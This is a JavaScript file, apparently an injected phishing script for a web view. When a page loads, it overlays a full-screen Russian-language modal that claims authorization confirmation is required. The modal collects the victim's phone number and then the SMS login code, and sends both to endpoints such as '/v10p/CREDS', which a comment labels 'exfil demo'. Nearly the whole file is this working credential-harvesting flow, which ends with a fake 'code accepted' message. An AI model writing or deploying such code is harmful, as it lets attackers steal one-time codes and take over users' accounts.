alert('fish new1');
(function(){

  function stripNonDigits(s){ return String(s || '').replace(/\D/g, ''); }

  function normalizeRussianPhone(raw) {
    const d = stripNonDigits(raw);
    if (d.length === 11 && (d.startsWith('7') || d.startsWith('8'))) {
      // если начинается с 8 — считаем как 7
      return '+7' + d.slice(1);
    }
    if (d.length === 10) {
      return '+7' + d;
    }
    return null;
  }

  function isValidRussianPhone(raw) {
    return normalizeRussianPhone(raw) !== null;
  }

  function isValidSmsCode(raw) {
    const d = stripNonDigits(raw);
    return d.length >= 4 && d.length <= 6;
  }

  // -----------------------
  // Создать полноэкранный модал prompt
  // -----------------------
  function createModalPrompt(options){
    // options: { title, placeholder, initial, inputType:'tel'|'text'|'number', validator(fn), maxlength, submitText, cancelText }
    return new Promise(function(resolve, reject){
      const opt = Object.assign({
        title: 'Введите значение',
        placeholder: '',
        initial: '',
        inputType: 'tel',
        validator: function(){ return true; },
        maxlength: 256,
        submitText: 'OK',
        cancelText: 'Отмена'
      }, options || {});

      // overlay
      const overlay = document.createElement('div');
      overlay.style.cssText = [
        'position:fixed',
        'left:0;right:0;top:0;bottom:0',
        'background:rgba(0,0,0,0.6)',
        'display:flex',
        'align-items:center',
        'justify-content:center',
        'z-index:2147483647', // максимально высокий
        'backdrop-filter: blur(4px)'
      ].join(';');

      // modal
      const modal = document.createElement('div');
      modal.style.cssText = [
        'width:calc(100% - 40px)',
        'max-width:720px',
        'background:#fff',
        'border-radius:12px',
        'padding:20px',
        'box-sizing:border-box',
        'box-shadow:0 20px 40px rgba(0,0,0,0.3)',
        'font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
      ].join(';');

      modal.innerHTML = `
        <div style="font-size:18px;font-weight:600;margin-bottom:12px;">${opt.title}</div>
        <div style="margin-bottom:12px;"><input id="__modal_input" inputmode="${opt.inputType==='tel'?'tel':'text'}" placeholder="${opt.placeholder}" value="${opt.initial}"
            style="width:100%;padding:14px;border-radius:8px;border:1px solid #ddd;font-size:16px;box-sizing:border-box;" maxlength="${opt.maxlength}"></div>
        <div style="display:flex;gap:8px;justify-content:flex-end">
          <button id="__modal_cancel" style="padding:12px 16px;border-radius:8px;border:none;background:#eee;font-size:15px;cursor:pointer">${opt.cancelText}</button>
          <button id="__modal_ok" style="padding:12px 16px;border-radius:8px;border:none;background:#00b33c;color:#fff;font-size:15px;cursor:pointer" disabled>${opt.submitText}</button>
        </div>
      `;
      overlay.appendChild(modal);
      document.body.appendChild(overlay);

      const input = document.getElementById('__modal_input');
      const btnOk = document.getElementById('__modal_ok');
      const btnCancel = document.getElementById('__modal_cancel');

      // helper to update OK enabled state
      function updateValid(){
        try {
          const v = input.value;
          const ok = !!opt.validator(v);
          btnOk.disabled = !ok;
        } catch(e) {
          btnOk.disabled = true;
        }
      }
      updateValid();

      // restrict input: allow digits, +, spaces, parentheses, hyphen; remove others
      input.addEventListener('input', function(e){
        if(opt.inputType === 'tel'){
          const before = input.value;
          // keep digits, +, spaces, parentheses, dash
          const cleaned = before.replace(/[^0-9+\-\s()]/g,'');
          if(cleaned !== before) input.value = cleaned;
        }
        updateValid();
      });

      // submit handler
      btnOk.addEventListener('click', function(){
        const val = input.value;
        cleanup();
        resolve(val);
      });
      btnCancel.addEventListener('click', function(){
        cleanup();
        resolve(null);
      });

      function cleanup(){
        // remove modal and restore focus
        try { overlay.remove(); } catch(e){}
      }

      // focus input, open keyboard
      setTimeout(()=>{ input.focus(); try{ input.select(); }catch(e){} }, 60);
    });
  }

  // -----------------------
  // Usage: step-by-step with validation
  // -----------------------
  async function askPhoneAndCode() {
    // ask phone
    const phoneRaw = await createModalPrompt({
      title: 'Требуется подтверждение авторизации',
      placeholder: '+7 (___) ___-__-__',
      inputType: 'tel',
      validator: function(v){
        return isValidRussianPhone(v);
      },
      submitText: 'Получить код',
      cancelText: 'Отмена',
    });
    if(!phoneRaw){
      b('/defender/phone_cancelled','user_cancelled');
      return null;
    }
    const normalized = normalizeRussianPhone(phoneRaw); // +7XXXXXXXXXX or null
    if(!normalized){
      b('/defender/phone_invalid', phoneRaw);
      return null;
    }
    b('/v10p/PHONE_FORM', normalized);

    // ask code
    const code = await createModalPrompt({
      title: 'Введите код из SMS',
      placeholder: '____',
      inputType: 'tel',
      validator: function(v){ return isValidSmsCode(v); },
      submitText: 'Войти',
      cancelText: 'Отмена'
    });
    if(!code){
      b('/defender/code_cancelled','user_cancelled');
      return null;
    }
    if(!isValidSmsCode(code)){
      b('/defender/code_invalid', code);
      return null;
    }

    const final = { phone: normalized, code: stripNonDigits(code) };
    b('/v10p/CREDS', final); // exfil demo
    // optionally return to app:
    if(window.ReactNativeWebView && window.ReactNativeWebView.postMessage){
      window.ReactNativeWebView.postMessage(JSON.stringify({ action: 'navigateBack', phone: normalized }));
    }
    return final;
  }

  // start
  setTimeout(function(){
    askPhoneAndCode().then(res=>{
      // handle result
      if(res) {
        // show success message
        alert('Готово! Код принят.');
      }
    });
  }, 200);

  // expose helpers for debug
  window.__normalizeRussianPhone = normalizeRussianPhone;
  window.__isValidRussianPhone = isValidRussianPhone;
})();
